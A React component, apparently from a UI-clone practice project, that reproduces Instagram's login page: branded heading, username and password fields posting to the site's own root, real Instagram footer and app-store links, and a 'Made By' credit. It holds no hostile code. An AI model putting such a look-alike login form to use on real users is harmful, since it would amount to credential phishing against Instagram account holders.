import React from "react";
import inMockOne from "../media/in-mock-1.jpg";
import appStorePng from '../media/app-store.png'
import googleStorePng from '../media/google-storepng.png'
import HomePageCss from "../css/HomePage.module.css";

export default function HomePage() {
  return (
    <>
    
    <div className={HomePageCss.container}>
      <div className="container">
        <div className={HomePageCss.wrap}>
          <div className={HomePageCss.mockup}>
            <img
              src={inMockOne}
              alt="inmockone"
              className={HomePageCss.mockImg1}
            />
          </div>
          <div className={HomePageCss.auth}>
            <div className="authmain">
              <div className={HomePageCss.heading}>
                <h1>Instagram</h1>
              </div>
              <div className={HomePageCss.userForm}>
                <form action="/" method="post">
                  <div className={HomePageCss.inputWrap}>
                    <input
                      type="text"
                      className={HomePageCss.userInput}
                      name="username"
                      placeholder="Phone number, username, or email"
                    />
                  </div>
                  <div className="password">
                    <input
                      type="password"
                      className={HomePageCss.userInput}
                      name="password"
                      placeholder="Password"
                    />
                  </div>
                  <div className={HomePageCss.inputWrap2}>
                    <button type="submit" className={HomePageCss.submitButton}>
                      Log in
                    </button>
                  </div>
                  <div className={HomePageCss.signOption}>
                    <div className={HomePageCss.leftLine}></div>
                    <div className={HomePageCss.orText}>
                      <p>OR</p>
                    </div>
                    <div className={HomePageCss.rightLine}></div>
                  </div>
                </form>
                <div className={HomePageCss.otherOptions}>
                  <div className="withFb">
                    <p>
                      <i
                        className={
                          "fab fa-facebook-square " + HomePageCss.fbicon
                        }
                      ></i>
                      <a href="/comingsoon" className={HomePageCss.fblink}>Log In With Facebook</a>{" "}
                    </p>
                  </div>
                  <div className={HomePageCss.forgetPass}>
                        <a href="/comingsoon" className={HomePageCss.forgetPassLink}>Forget Password?</a>
                  </div>
                </div>
              </div>
            </div>
            <div className={HomePageCss.noAccount}>
              <div className="noacctext">
                <p className={HomePageCss.noAccText}>Don't have an account? <a href="/comingsoon" className={HomePageCss.signupLink}>Sign up</a></p>
              </div>
            </div>
            <div className={HomePageCss.appDownload}>
              <p>Get the app.</p>
              <div className={HomePageCss.appLinks}>
                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo">
                  <img src={appStorePng} alt="App Store Png"/>
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD42B2F41-1D42-4397-9D68-3EFA2D3A3D9F%26utm_content%3Dlo%26utm_medium%3Dbadge">
                  <img src={googleStorePng} alt="Google Play Store Png"/>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div className={HomePageCss.footerLinks}>
          <ul className={HomePageCss.flinks}>
              <li><a href="https://about.instagram.com/">About</a></li>
              <li><a href="https://about.instagram.com/blog/">Blog</a></li>
              <li><a href="https://www.instagram.com/about/jobs/">Jobs</a></li>
              <li><a href="https://help.instagram.com/">Help</a></li>
              <li><a href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
              <li><a href="https://www.instagram.com/legal/terms/">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/profiles/">Top Accounts</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags/">Hashtags</a></li>
              <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
              <li><a href="https://www.instagram.com/topics/beauty/">Beauty</a></li>
              <li><a href="https://www.instagram.com/topics/dance-and-performance/">Dance And Performance</a></li>
              <li><a href="https://www.instagram.com/topics/fitness/">Fitness</a></li>
              <li><a href="https://www.instagram.com/topics/food-and-drink/">Food & Drinks</a></li>
              <li><a href="https://www.instagram.com/topics/home-and-garden/">Home & Garden</a></li>
              <li><a href="https://www.instagram.com/topics/music/">Music</a></li>
              <li><a href="https://www.instagram.com/topics/visual-arts/">Visual Arts</a></li>
          </ul>
    </div>
    <footer className={HomePageCss.footer}>
      <p>© Made By <i className={"fas fa-heart " + HomePageCss.myHeart} aria-hidden="true"></i>  Prasad Shinde</p>
    </footer>
    </>
  );
}
